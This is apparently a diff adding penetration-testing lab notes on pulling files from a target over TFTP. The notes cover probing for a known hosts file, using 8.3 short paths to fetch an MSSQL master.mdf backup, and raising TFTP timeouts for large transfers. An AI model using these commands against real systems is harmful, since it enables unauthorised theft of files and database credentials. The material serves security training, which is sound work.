@@ -1,0 +1,40 @@
+# You will usually need to know what files are present to pull files with tftp
+# Check for know file
+/etc/hosts		# Linux
+C:\Windows\System32\driversetc\hosts		# Windows
+# 10.11.1.111 1NSIDER
+tftp 10.11.1.111
+tftp> get \Windows\System32\driversetc\hosts
+
+# TFTP doesn't like spaces in path names,  use 8.3 filenames
+https://en.wikipedia.org/wiki/8.3_filename
+# 10.11.1.111 1NSIDER
+tftp> get \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
+
+# TFTP has a timeout.  We can increase it for large files
+# 10.11.1.111 1NSIDER
+tftp> ?
+Commands may be abbreviated.  Commands are:
+
+connect         connect to remote tftp
+mode            set file transfer mode
+put             send file
+get             receive file
+quit            exit tftp
+verbose         toggle verbose mode
+trace           toggle packet tracing
+status          show current status
+binary          set mode to octet
+ascii           set mode to netascii
+rexmt           set per-packet retransmission timeout
+timeout         set total retransmission timeout
+?               print help information
+tftp> mode
+Using netascii mode to transfer files.
+tftp> timeout 600
+tftp> binary
+mode set to octet
+tftp> status
+Connected to 10.11.1.111.
+Mode: octet Verbose: on Tracing: off
+
